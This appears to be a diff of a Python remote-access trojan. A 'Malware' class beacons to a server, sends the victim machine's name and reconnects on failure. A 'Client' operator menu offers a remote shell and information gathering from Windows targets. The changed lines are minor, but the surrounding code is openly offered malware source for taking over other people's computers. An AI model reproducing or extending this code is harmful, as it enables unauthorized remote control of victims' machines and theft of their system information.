@@ -38,7 +38,6 @@ class Malware(Machine):
             print("try to co ....")
             self.my_socket.connect(self.server_addr)
             self.send(os.environ["COMPUTERNAME"])
-            time.sleep(1)
         except socket.error:
             self.start()
         except TimeoutError:
@@ -138,7 +137,7 @@ class Client(Machine):
               "    / /\\/\\ \\ (_| | | | | | / /\\/\\ \\  __/ | | | |_| |\n",
               "    \\/    \\/\\__,_|_|_| |_| \\/    \\/\\___|_| |_|\\__,_|\n",
               "                                                    \n")
-        print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
+        print("Press 1 to access the remote shell")
         print("Press 2 to get informations (For windows target only)")
         print("Press 0 to quit")
         choice = input()
@@ -190,3 +189,4 @@ class Client(Machine):
         print("Press 5 to return to the main menu")
         print("Press 0 to quit")
         return input()
+    
